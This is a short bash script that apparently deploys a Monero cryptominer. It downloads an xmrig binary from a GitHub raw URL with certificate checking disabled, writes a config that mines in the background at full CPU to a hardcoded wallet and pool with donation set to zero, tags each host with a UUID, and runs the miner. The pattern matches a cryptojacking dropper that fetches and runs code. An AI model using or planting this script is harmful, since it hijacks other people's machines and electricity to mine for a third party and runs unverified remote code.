#!/bin/bash

# variables
BASE_URL="https://raw.githubusercontent.com/zkysimon/xmr/main/xmrig"
POOL="pool.minexmr.com:3333"
WALLET="43K8b6cvTxQSQYBxE5y1uCFRXrmSazVf5fP2T31uZiBWKnyTgGKurgtL7H67TMb2KTPYfjdoJMdve4PTXcUTtyaCUD6YAVY"
UUID=$(cut -d '-' -f 1 /proc/sys/kernel/random/uuid)
BACKGROUND=true
DONATE=0

wget --no-check-certificate ${BASE_URL}
chmod +x xmrig

# prepare config
rm -f config.json
cat > config.json << EOF
{
    "autosave": true,
    "background": ${BACKGROUND},
    "randomx": {
        "1gb-pages": true
    },
    "donate-level": ${DONATE},
    "cpu": {
        "enabled": true,
        "max-threads-hint": 100
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": null,
            "algo": null,
            "url": "${POOL}",
            "user": "${WALLET}+100000.${UUID}",
            "rig-id": "${UUID}",
            "pass": "x",
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOF

# load service
./xmrig
